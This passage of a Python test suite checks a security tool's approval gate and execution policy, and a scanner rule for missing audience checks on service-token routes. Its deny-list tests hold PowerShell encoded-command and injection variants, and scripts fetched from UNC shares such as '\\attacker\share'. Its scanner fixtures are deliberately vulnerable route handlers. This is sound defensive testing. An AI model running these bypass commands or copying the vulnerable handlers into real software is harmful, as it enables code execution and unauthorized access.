                tid = f"TR-NEW-{i:03d}"
                db.save_worker_trace(
                    trace_id=tid,
                    task_id="TASK-PAG",
                    worker_id="w1",
                    intent_id=f"CAND-{i}",
                    tool_name="DESYNC",
                    target_asset_id="A2",
                    status="FAILED",
                    summary="DESYNC probe",
                    raw_observation="none",
                )
            db.conn.execute("UPDATE worker_execution_traces SET created_at = '2026-01-01 00:00:00' WHERE trace_id LIKE 'TR-NEW-%'")
            db.conn.commit()
        finally:
            db.close()

        root = str(Path(__file__).resolve().parent.parent)
        env = {**os.environ, "RFCHUNT_OFFLINE": "1", "CI": "true"}
        for entry in ("main.py", "rfc_hunt_swarm.py"):
            r_rt = subprocess.run(
                [sys.executable, entry, "retest", "--db", str(db_path), "--chain-id", "CHAIN-OLD-TARGET-001", "--json"],
                cwd=root, env=env, capture_output=True, text=True, timeout=30,
            )
            assert r_rt.returncode == 0, r_rt.stderr + r_rt.stdout
            assert json.loads(r_rt.stdout)[0]["chain_id"] == "CHAIN-OLD-TARGET-001"

            r_adv = subprocess.run(
                [sys.executable, entry, "export-advisory", "--db", str(db_path), "--chain-id", "CHAIN-OLD-TARGET-001", "--out", str(tmp_path / f"adv_{entry}"), "--json"],
                cwd=root, env=env, capture_output=True, text=True, timeout=30,
            )
            assert r_adv.returncode == 0, r_adv.stderr + r_adv.stdout
            assert json.loads(r_adv.stdout)["Advisories Exported"] == 1

            r_tr = subprocess.run(
                [sys.executable, entry, "traces", "--db", str(db_path), "--query", "AUTH_BOUNDARY", "--json"],
                cwd=root, env=env, capture_output=True, text=True, timeout=30,
            )
            assert r_tr.returncode == 0, r_tr.stderr + r_tr.stdout
            tr_rows = json.loads(r_tr.stdout)
            assert any(t["trace_id"] == "TR-OLD-AUTH-001" for t in tr_rows)

            r_ch = subprocess.run(
                [sys.executable, entry, "chains", "--db", str(db_path), "--min-poe", "3", "--verified-only", "--json"],
                cwd=root, env=env, capture_output=True, text=True, timeout=30,
            )
            assert r_ch.returncode == 0, r_ch.stderr + r_ch.stdout
            ch_rows = json.loads(r_ch.stdout)
            assert len(ch_rows) == 1 and ch_rows[0]["chain_id"] == "CHAIN-OLD-TARGET-001"

            r_miss_rt = subprocess.run(
                [sys.executable, entry, "retest", "--db", str(db_path), "--chain-id", "CHAIN-MISSING-999"],
                cwd=root, env=env, capture_output=True, text=True, timeout=30,
            )
            assert r_miss_rt.returncode != 0

            r_miss_adv = subprocess.run(
                [sys.executable, entry, "export-advisory", "--db", str(db_path), "--chain-id", "CHAIN-MISSING-999"],
                cwd=root, env=env, capture_output=True, text=True, timeout=30,
            )
            assert r_miss_adv.returncode != 0
    finally:
        os.environ.pop("ARTEX_SECRET_KEY", None)


def test_approval_gate_method_scope_empty_and_raptor_ps1_bypass_hardening(tmp_path):
    gate = ApprovalGate(
        mode="policy",
        rules=[
            ApprovalRule(
                rule_id="GET-ONLY-LOCAL",
                rule_type="exact_host",
                action="APPROVE",
                pattern="127.0.0.1",
                method_scope="GET",
            ),
            ApprovalRule(
                rule_id="ALLOW-ALL",
                rule_type="regex",
                action="APPROVE",
                pattern=".*",
            ),
        ],
    )

    # method="" must NOT satisfy method_scope="GET" on GET-ONLY-LOCAL
    assert gate.rules[0].matches(target="http://127.0.0.1:8080/x", method="") is False
    assert gate.rules[0].matches(target="http://127.0.0.1:8080/x", method="GET") is True

    # Verify gate with ONLY the method_scope rule rejects method="" in deny mode / doesn't match rule
    gate_ms = ApprovalGate(
        mode="deny",
        rules=[
            ApprovalRule(
                rule_id="GET-ONLY-LOCAL",
                rule_type="exact_host",
                action="APPROVE",
                pattern="127.0.0.1",
                method_scope="GET",
            )
        ],
    )
    d_empty = gate_ms.check(action_type="network_socket", target="http://127.0.0.1:8080/x", method="", is_high_risk=True)
    assert d_empty.approved is False
    assert d_empty.rule_id != "GET-ONLY-LOCAL"
    d_get = gate_ms.check(action_type="network_socket", target="http://127.0.0.1:8080/x", method="GET", is_high_risk=True)
    assert d_get.approved is True
    assert d_get.rule_id == "GET-ONLY-LOCAL"

    # Substring "raptorscan" in PowerShell -Command / -EncodedCommand must be hard-denied
    for bad_cmd in (
        ["powershell.exe", "-Command", "Invoke-WebRequest http://example.com # raptorscan"],
        ["powershell.exe", "-EncodedCommand", "ZABpAHIA", "raptorscan"],
        ["pwsh.exe", "-c", "whoami", "Invoke-RaptorScan.ps1"],
        ["powershell", "-e", "ZABpAHIA", "-File", "scripts/Invoke-RaptorScan.ps1"],
    ):
        dec = gate.check(action_type="subprocess", target=" ".join(bad_cmd), command=bad_cmd, is_high_risk=True)
        assert dec.approved is False, f"Expected hard deny for {bad_cmd}"
        assert dec.rule_id == "EXECUTION_POLICY_HARD_DENY"

    # Legitimate Invoke-RaptorScan.ps1 -File invocation remains permitted by policy
    good_cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", "scripts/Invoke-RaptorScan.ps1"]
    dec_good = gate.check(action_type="subprocess", target=" ".join(good_cmd), command=good_cmd, is_high_risk=True)
    assert dec_good.approved is True


def test_mantis_auth_011_negative_guarded_go_ts_claims_is_service_account_and_aud(tmp_path, monkeypatch):
    monkeypatch.setenv("RFCHUNT_OFFLINE", "1")
    repo = tmp_path / "guarded_repo"
    repo.mkdir()

    (repo / "worker_guarded.go").write_text(
        '''
package server
import "net/http"
func RegisterRoutes(mux *http.ServeMux) {
    mux.HandleFunc("/internal/worker/run", func(w http.ResponseWriter, r *http.Request) {
        claims, err := verifyOIDC(r.Header.Get("Authorization"))
        if err != nil || !claims.IsServiceAccount || claims.Aud != "internal-svc" {
            w.WriteHeader(403)
            return
        }
        w.WriteHeader(200)
    })
}
''',
        encoding="utf-8",
    )

    (repo / "rpc_guarded.ts").write_text(
        '''
export function mountRpc(router: any) {
  router.post("/rpc/agent/exec", async (req: any, res: any) => {
    const claims = await verifyIdToken(req.headers.authorization);
    if (!claims.isServiceAccount || claims.audience !== "internal-rpc") {
      return res.status(403).json({ error: "forbidden" });
    }
    return res.json({ ok: true });
  });
}
''',
        encoding="utf-8",
    )

    db = Database(":memory:")
    try:
        integrator = MantisIntegrator(db=db, reports_dir=str(tmp_path / "reports"), use_fusion=True)
        res = integrator.run_scan(target_path=str(repo), depth=100, mode="scan")
        auth011 = [f for f in res["findings"] if f["rule_id"] == "MANTIS-AUTH-011"]
        assert auth011 == []
    finally:
        db.close()


def test_raptor_ps1_strict_allowlist_parser_rejects_all_bypasses():
    from engine.approval_gate import _is_safe_raptor_ps1
    from engine.execution_policy import ExecutionPolicy

    gate = ApprovalGate(
        mode="policy",
        rules=[ApprovalRule(rule_id="ALLOW-ALL", rule_type="regex", action="APPROVE", pattern=".*")],
    )
    policy = ExecutionPolicy.get_instance()

    bypass_variants = [
        ["powershell.exe", "other.ps1", "-File", "scripts/Invoke-RaptorScan.ps1"],
        ["powershell.exe", "-File", "other.ps1", "-File", "scripts/Invoke-RaptorScan.ps1"],
        ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-File", "other.ps1"],
        ["powershell.exe", "/Command", "echo ok", "-File", "raptorscan.ps1"],
        ["powershell.exe", "/EncodedCommand", "b2s=", "-File", "raptorscan.ps1"],
        ["powershell.exe", "/c", "whoami", "-File", "raptorscan.ps1"],
        ["powershell.exe", "/ec", "b2s=", "-File", "raptorscan.ps1"],
        ["powershell.exe", "-c:echo", "ok", "-File", "raptorscan.ps1"],
        ["powershell.exe", "-e:b2s=", "-File", "raptorscan.ps1"],
        ["powershell.exe", "-File:other.ps1", "-File", "raptorscan.ps1"],
        ["powershell.exe", "-File", "../scripts/Invoke-RaptorScan.ps1"],
        ["powershell.exe", "-File", r"\\attacker\share\raptorscan.ps1"],
        ["powershell.exe", "-File", "//attacker/share/raptorscan.ps1"],
        ["powershell.exe", "-File", r"\/attacker\share\raptorscan.ps1"],
        ["powershell.exe", "-File", r"/\attacker\share\raptorscan.ps1"],
        ["powershell.exe", "-File", "C:raptorscan.ps1"],
        ["powershell.exe", "-File", "c:scripts/Invoke-RaptorScan.ps1"],
        ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-Command", "whoami"],
        ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-c:whoami"],
    ]
    for cmd in bypass_variants:
        assert _is_safe_raptor_ps1(cmd) is False, f"Expected _is_safe_raptor_ps1 False for {cmd}"
        dec = gate.check(action_type="subprocess", target=" ".join(cmd), command=cmd, is_high_risk=True)
        assert dec.approved is False and dec.rule_id == "EXECUTION_POLICY_HARD_DENY", f"Gate failed to deny {cmd}: {dec}"
        ok, _ = policy.validate_subprocess_command(cmd)
        assert ok is False, f"ExecutionPolicy failed to reject {cmd}"

    legit_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."]
    assert _is_safe_raptor_ps1(legit_cmd) is True
    assert gate.check(action_type="subprocess", target=" ".join(legit_cmd), command=legit_cmd, is_high_risk=True).approved is True
    assert policy.validate_subprocess_command(legit_cmd)[0] is True


def test_mantis_auth_011_detects_five_false_negative_traps_and_keeps_genuine_guards_zero(tmp_path, monkeypatch):
    monkeypatch.setenv("RFCHUNT_OFFLINE", "1")

    traps = {
        "trap_comment_go.go": """package server
import "net/http"
func RegisterRoutes(mux *http.ServeMux) {
    mux.HandleFunc("/internal/worker/run", func(w http.ResponseWriter, r *http.Request) {
        // TODO: we do not validate audience yet, any end-user OIDC token works!
        claims, err := verifyOIDC(r.Header.Get("Authorization"))
        if err != nil { w.WriteHeader(401); return }
        _ = claims
        w.WriteHeader(200)
    })
}
""",
        "trap_var_ts.ts": """export function mountRpc(router: any) {
  router.post("/rpc/dispatch", async (req: any, res: any) => {
    const user = await verifyIdToken(req.headers.authorization);
    const audience = user.aud;
    return res.json({ ok: true, audience });
  });
}
""",
        "trap_log_claims_aud.go": """package server
import (
    "log"
    "net/http"
)
func RegisterRoutes(mux *http.ServeMux) {
    mux.HandleFunc("/internal/worker/run", func(w http.ResponseWriter, r *http.Request) {
        claims, err := verifyOIDC(r.Header.Get("Authorization"))
        if err != nil { w.WriteHeader(401); return }
        log.Printf("user accepted on worker route aud=%s", claims.Aud)
        w.WriteHeader(200)
    })
}
""",
        "trap_neighbor_guard.ts": """export function mountRoutes(router: any) {
  router.post("/internal/unguarded", async (req: any, res: any) => {
    const user = await verifyIdToken(req.headers.authorization);
    return res.json({ ok: true, user });
  });
  router.post("/internal/guarded", async (req: any, res: any) => {
    const claims = await verifyIdToken(req.headers.authorization);
    if (!claims.isServiceAccount) return res.status(403).end();
    return res.json({ ok: true });
  });
}
""",
        "trap_comment_py.py": """from fastapi import FastAPI, Depends
app = FastAPI()

@app.post("/service/execute")
def exec_service(user=Depends(get_current_user)):
    # BUG: missing audience= check here!
    return {"ok": True, "user": user}
""",
    }

    for fname, body in traps.items():
        trap_dir = tmp_path / fname.split(".")[0]
        trap_dir.mkdir()
        (trap_dir / fname).write_text(body, encoding="utf-8")
        db = Database(":memory:")
        try:
            integrator = MantisIntegrator(db=db, reports_dir=str(trap_dir / "reports"), use_fusion=True)
            res = integrator.run_scan(target_path=str(trap_dir), depth=100, mode="scan")
            auth011 = [f for f in res["findings"] if f["rule_id"] == "MANTIS-AUTH-011"]
            assert len(auth011) == 1, f"Expected 1 MANTIS-AUTH-011 finding for {fname}, got {len(auth011)}: {auth011}"
        finally:
            db.close()

    # Genuine guard with claims.Aud != ... and claims.audience !== ... must remain 0
    neg_dir = tmp_path / "genuine_guarded"
    neg_dir.mkdir()
    (neg_dir / "safe.go").write_text(
        """package server
import "net/http"
func Reg(mux *http.ServeMux) {
    mux.HandleFunc("/internal/worker/run", func(w http.ResponseWriter, r *http.Request) {
        claims, _ := verifyOIDC(r.Header.Get("Authorization"))
        if claims.Aud != "internal-svc" { w.WriteHeader(403); return }
        w.WriteHeader(200)
    })
}
""",
        encoding="utf-8",
    )
    (neg_dir / "safe.ts").write_text(
        """export function reg(router: any) {
  router.post("/rpc/dispatch", async (req: any, res: any) => {
    const claims = await verifyIdToken(req.headers.authorization);
    if (claims.audience !== "internal-rpc") return res.status(403).end();
    return res.json({ ok: true });
  });
}
""",
        encoding="utf-8",
    )
    db_neg = Database(":memory:")
    try:
        res_neg = MantisIntegrator(db=db_neg, reports_dir=str(neg_dir / "reports"), use_fusion=True).run_scan(
            target_path=str(neg_dir), depth=100, mode="scan"
        )
        assert [f for f in res_neg["findings"] if f["rule_id"] == "MANTIS-AUTH-011"] == []
    finally:
        db_neg.close()


def test_unc_tokens0_and_drive_relative_script_rejected_with_zero_fs_touches(monkeypatch):
    from engine.approval_gate import _is_safe_raptor_ps1
    from engine.execution_policy import ExecutionPolicy

    unc_touches = []
    orig_exists = Path.exists
    orig_is_symlink = Path.is_symlink

    def _track_exists(self):
        s = str(self)
        norm = s.replace("\\", "/")
        if norm.startswith("//") or self.drive.startswith(("\\\\", "//")):
            unc_touches.append(("exists", s))
        return orig_exists(self)

    def _track_is_symlink(self):
        s = str(self)
        norm = s.replace("\\", "/")
        if norm.startswith("//") or self.drive.startswith(("\\\\", "//")):
            unc_touches.append(("is_symlink", s))
        return orig_is_symlink(self)

    monkeypatch.setattr(Path, "exists", _track_exists)
    monkeypatch.setattr(Path, "is_symlink", _track_is_symlink)

    gate = ApprovalGate(
        mode="policy",
        rules=[ApprovalRule(rule_id="ALLOW-ALL", rule_type="regex", action="APPROVE", pattern=".*")],
    )
    policy = ExecutionPolicy.get_instance()

    blocked_cmds = [
        [r"\\remote-share\share\powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1"],
        ["//remote-share/share/powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1"],
        [r"\/remote-share\share\powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1"],
        [r"/\remote-share\share\pwsh.exe", "-File", "scripts/Invoke-RaptorScan.ps1"],
        [r"\\?\UNC\remote-share\share\powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1"],
        [r"\\.\UNC\remote-share\share\pwsh.exe", "-File", "scripts/Invoke-RaptorScan.ps1"],
        [r"\/remote-share\share\python.exe", "-V"],
        [r"\\?\UNC\remote-share\share\python.exe", "-V"],
        [r"\\remote-share\share\git.exe", "status"],
        ["powershell.exe", "-File", "C:raptorscan.ps1"],
    ]
    for cmd in blocked_cmds:
        assert _is_safe_raptor_ps1(cmd) is False, f"Expected _is_safe_raptor_ps1 False for {cmd}"
        dec = gate.check(action_type="subprocess", target=" ".join(cmd), command=cmd, is_high_risk=True)
        assert dec.approved is False and dec.rule_id == "EXECUTION_POLICY_HARD_DENY", f"Gate failed to deny {cmd}: {dec}"
        ok, _ = policy.validate_subprocess_command(cmd)
        assert ok is False, f"ExecutionPolicy failed to reject {cmd}"

    assert unc_touches == [], f"Unexpected UNC filesystem touches: {unc_touches}"

    legit_pwsh = ["pwsh.exe", "-NoProfile", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."]
    assert _is_safe_raptor_ps1(legit_pwsh) is True
    assert gate.check(action_type="subprocess", target=" ".join(legit_pwsh), command=legit_pwsh, is_high_risk=True).approved is True
    assert policy.validate_subprocess_command(legit_pwsh)[0] is True


def test_canonical_nt_unc_drive_relative_trailing_and_outside_repo_zero_fs_touches(tmp_path, monkeypatch):
    from engine.approval_gate import _is_safe_raptor_ps1, parse_simple_argv
    from engine.execution_policy import ExecutionPolicy
    from engine.external_scanners import _validate_binary_candidate

    fs_touches = []
    orig_exists = Path.exists
    orig_is_symlink = Path.is_symlink
    orig_is_dir = Path.is_dir
    orig_is_file = Path.is_file
    orig_resolve = Path.resolve

    def _is_adversarial_probe_path(s: str) -> bool:
        norm = s.replace("\\", "/")
        norm_l = norm.lower()
        return (
            norm.startswith("//")
            or norm_l.startswith(("/??/", "/device/", "/global??/", "/dosdevices/"))
            or "sample-host" in norm_l
            or "remote-share" in norm_l
            or ":stream" in norm_l
            or ":$data" in norm_l
            or s.rstrip().endswith(("/", "\\", "."))
            or (len(norm) >= 2 and norm[1] == ":" and not norm[2:].startswith("/"))
        )

    def _wrap_probe(name, orig):
        def _inner(self, *args, **kwargs):
            s = str(self)
            if _is_adversarial_probe_path(s):
                fs_touches.append((name, s))
            return orig(self, *args, **kwargs)
        return _inner

    monkeypatch.setattr(Path, "exists", _wrap_probe("exists", orig_exists))
    monkeypatch.setattr(Path, "is_symlink", _wrap_probe("is_symlink", orig_is_symlink))
    monkeypatch.setattr(Path, "is_dir", _wrap_probe("is_dir", orig_is_dir))
    monkeypatch.setattr(Path, "is_file", _wrap_probe("is_file", orig_is_file))
    monkeypatch.setattr(Path, "resolve", _wrap_probe("resolve", orig_resolve))

    gate = ApprovalGate(
        mode="policy",
        rules=[ApprovalRule(rule_id="ALLOW-ALL", rule_type="regex", action="APPROVE", pattern=".*")],
    )
    policy = ExecutionPolicy.get_instance()

    nt_unc_prefixes = [
        r"\\sample-host\share",
        "//sample-host/share",
        r"\/sample-host\share",
        r"/\sample-host\share",
        r"\\?\UNC\sample-host\share",
        r"\\.\UNC\sample-host\share",
        r"\??\UNC\sample-host\share",
        "/??/UNC/sample-host/share",
        r"\Device\Mup\sample-host\share",
        r"\Global??\UNC\sample-host\share",
        r"\DosDevices\UNC\sample-host\share",
    ]

    for pfx in nt_unc_prefixes:
        sep = "/" if "/" in pfx and "\\" not in pfx else "\\"
        for cmd in (
            [f"{pfx}{sep}powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."],
            [f"{pfx}{sep}pwsh.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."],
            [f"{pfx}{sep}python.exe", "--version"],
            ["powershell.exe", "-File", f"{pfx}{sep}Invoke-RaptorScan.ps1", "-TargetPath", "."],
        ):
            assert _is_safe_raptor_ps1(cmd) is False, f"Expected False for {cmd}"
            assert policy.validate_subprocess_command(cmd)[0] is False, f"Policy must reject {cmd}"
            dec = gate.check(action_type="subprocess", target=" ".join(cmd), command=cmd, is_high_risk=True)
            assert dec.approved is False and dec.rule_id == "EXECUTION_POLICY_HARD_DENY", f"Gate must deny {cmd}: {dec}"
            assert parse_simple_argv(cmd) is None, f"parse_simple_argv must reject {cmd}"

        with pytest.raises(PermissionError):
            _validate_binary_candidate(f"{pfx}{sep}httpx.exe", "httpx")

    # Drive-relative tokens[0], trailing slashes, trailing dot/space, and outside-repo -File paths
    extra_bypasses = [
        ["C:powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."],
        ["C:git.exe", "status"],
        ["powershell.exe/", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."],
        ["powershell.exe.", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."],
        ["powershell.exe ", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."],
        ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1/"],
        ["pwsh.exe", "-File", r"scripts\Invoke-RaptorScan.ps1\\"],
        ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1."],
        ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1 "],
        ["powershell.exe", "-File", r"C:\Users\sample_user\Invoke-RaptorScan.ps1"],
        ["pwsh.exe", "-File", r"D:\other_dir\raptorscan.ps1"],
        ["powershell.exe", "-File", "Invoke-RaptorScan.ps1"],
    ]
    for cmd in extra_bypasses:
        assert _is_safe_raptor_ps1(cmd) is False, f"Expected _is_safe_raptor_ps1 False for {cmd}"
        assert policy.validate_subprocess_command(cmd)[0] is False, f"Policy must reject {cmd}"
        dec = gate.check(action_type="subprocess", target=" ".join(cmd), command=cmd, is_high_risk=True)
        assert dec.approved is False and dec.rule_id == "EXECUTION_POLICY_HARD_DENY", f"Gate must deny {cmd}: {dec}"

    assert parse_simple_argv(["C:git.exe", "status"]) is None
    assert parse_simple_argv(["httpx.exe/", "-u", "https://example.com"]) is None
    assert parse_simple_argv(["httpx.exe.", "-u", "https://example.com"]) is None

    assert fs_touches == [], f"Adversarial paths must trigger 0 FS touches, got: {fs_touches}"

    # Legitimate control succeeds even from an isolated temp CWD
    monkeypatch.chdir(tmp_path)
    legit_from_temp = ["powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1", "-TargetPath", "."]
    assert _is_safe_raptor_ps1(legit_from_temp) is True
    assert policy.validate_subprocess_command(legit_from_temp)[0] is True
    assert gate.check(action_type="subprocess", target=" ".join(legit_from_temp), command=legit_from_temp, is_high_risk=True).approved is True


def test_r3_split_tokens_del_and_globalroot_hardening_zero_fs_touches(monkeypatch):
    from engine.approval_gate import _is_safe_raptor_ps1, parse_simple_argv
    from engine.execution_policy import ExecutionPolicy, _is_unsafe_mount_source
    from engine.external_scanners import _validate_binary_candidate

    fs_touches = []
    orig_exists = Path.exists
    orig_is_symlink = Path.is_symlink
    orig_is_dir = Path.is_dir
    orig_is_file = Path.is_file
    orig_resolve = Path.resolve

    def _wrap_all(name, orig):
        def _inner(self, *args, **kwargs):
            fs_touches.append((name, str(self)))
            return orig(self, *args, **kwargs)
        return _inner

    monkeypatch.setattr(Path, "exists", _wrap_all("exists", orig_exists))
    monkeypatch.setattr(Path, "is_symlink", _wrap_all("is_symlink", orig_is_symlink))
    monkeypatch.setattr(Path, "is_dir", _wrap_all("is_dir", orig_is_dir))
    monkeypatch.setattr(Path, "is_file", _wrap_all("is_file", orig_is_file))
    monkeypatch.setattr(Path, "resolve", _wrap_all("resolve", orig_resolve))

    gate = ApprovalGate(
        mode="policy",
        rules=[ApprovalRule(rule_id="ALLOW-ALL", rule_type="regex", action="APPROVE", pattern=".*")],
    )
    policy = ExecutionPolicy.get_instance()

    # 1. String commands with \" / \' / \  must NOT strip backslashes from Windows NT/UNC/Device paths
    string_bypasses = [
        r'\\sample-host\share\powershell.exe -File "scripts/Invoke-RaptorScan.ps1" -Note \"x\"',
        r'\\sample-host\share\powershell.exe -File scripts/Invoke-RaptorScan.ps1 -Note \ x',
        r'\??\UNC\sample-host\share\powershell.exe -File "scripts/Invoke-RaptorScan.ps1" -Note \"x\"',
        r'\Device\Mup\sample-host\share\powershell.exe -File "scripts/Invoke-RaptorScan.ps1" -Note \"x\"',
        r'"\\sample-host\share\powershell.exe" -File "scripts/Invoke-RaptorScan.ps1" -Note \"x\"',
        r'\\sample-host\share\httpx.exe -u https://example.com -Note \"x\"',
        r'\GlobalRoot\Device\Mup\sample-host\share\powershell.exe -File "scripts/Invoke-RaptorScan.ps1" -Note \"x\"',
    ]
    for cmd_str in string_bypasses:
        assert parse_simple_argv(cmd_str) is None, f"parse_simple_argv must reject {cmd_str!r}"
        dec = gate.check(action_type="subprocess", target=cmd_str, command=cmd_str, is_high_risk=True)
        assert dec.approved is False and dec.rule_id == "EXECUTION_POLICY_HARD_DENY", (
            f"Gate must hard-deny {cmd_str!r}, got {dec}"
        )

    assert fs_touches == [], f"String UNC/NT/Device/GlobalRoot probes must trigger 0 FS touches, got: {fs_touches}"

    # Quoted/unquoted -File UNC/NT/GlobalRoot targets with \" or \  must also be hard-denied (0 touches on -File)
    for bad_script_cmd in (
        r'powershell.exe -File "\\sample-host\share\Invoke-RaptorScan.ps1" -Note \"x\"',
        r'powershell.exe -File \??\UNC\sample-host\share\Invoke-RaptorScan.ps1 -Note \ x',
        r'powershell.exe -File "\GlobalRoot\Device\Mup\sample-host\share\Invoke-RaptorScan.ps1" -Note \"x\"',
    ):
        dec = gate.check(action_type="subprocess", target=bad_script_cmd, command=bad_script_cmd, is_high_risk=True)
        assert dec.approved is False and dec.rule_id == "EXECUTION_POLICY_HARD_DENY"
    assert all("sample-host" not in p.lower() and "globalroot" not in p.lower() for _, p in fs_touches)
    fs_touches.clear()

    # 2. ASCII DEL (\x7f) must fail closed with 0 FS touches
    assert parse_simple_argv(["httpx.exe\x7f", "-u", "https://example.com"]) is None
    assert parse_simple_argv("httpx.exe\x7f -u https://example.com") is None
    dec_del_sub = gate.check(
        action_type="subprocess",
        target="httpx",
        command=["httpx.exe\x7f", "-u", "https://example.com"],
        is_high_risk=True,
    )
    assert dec_del_sub.approved is False and dec_del_sub.rule_id == "EXECUTION_POLICY_HARD_DENY"
    dec_del_fw = gate.check(action_type="file_write", target="reports/out.txt\x7f", is_high_risk=True)
    assert dec_del_fw.approved is False and dec_del_fw.rule_id == "EXECUTION_POLICY_HARD_DENY"
    with pytest.raises(PermissionError):
        _validate_binary_candidate("httpx.exe\x7f", "httpx")
    assert fs_touches == [], f"DEL (\\x7f) probes must trigger 0 FS touches, got: {fs_touches}"

    # 3. \GlobalRoot\ / /GlobalRoot/ NT Object Manager prefix must fail closed with 0 FS touches
    globalroot_ps = [r"\GlobalRoot\Device\Mup\sample-host\share\powershell.exe", "-File", "scripts/Invoke-RaptorScan.ps1"]
    assert _is_safe_raptor_ps1(globalroot_ps) is False
    assert parse_simple_argv(globalroot_ps) is None
    assert policy.validate_subprocess_command(globalroot_ps)[0] is False
    dec_gr = gate.check(action_type="subprocess", target=" ".join(globalroot_ps), command=globalroot_ps, is_high_risk=True)
    assert dec_gr.approved is False and dec_gr.rule_id == "EXECUTION_POLICY_HARD_DENY"
    assert _is_unsafe_mount_source(r"\GlobalRoot\Device\Mup\sample-host\share\data") is True
    assert _is_unsafe_mount_source("/GlobalRoot/Device/Mup/sample-host/share/data") is True
    with pytest.raises(PermissionError):
        _validate_binary_candidate(r"\GlobalRoot\Device\Mup\sample-host\share\httpx.exe", "httpx")
    with pytest.raises(PermissionError):
        _validate_binary_candidate("/GlobalRoot/Device/Mup/sample-host/share/httpx.exe", "httpx")
    assert fs_touches == [], f"GlobalRoot probes must trigger 0 FS touches, got: {fs_touches}"

    # 4. Legitimate Windows backslash string commands with \" still parse cleanly and preserve backslashes
    win_toks = parse_simple_argv(r'C:\Tools\httpx.exe -u https://example.com -Note \"x\"')
    assert win_toks is not None and win_toks[0] == r"C:\Tools\httpx.exe"
    legit_str = r'powershell.exe -File "scripts\Invoke-RaptorScan.ps1" -Note \"x\"'
    assert gate.check(action_type="subprocess", target="ps", command=legit_str, is_high_risk=True).approved is True
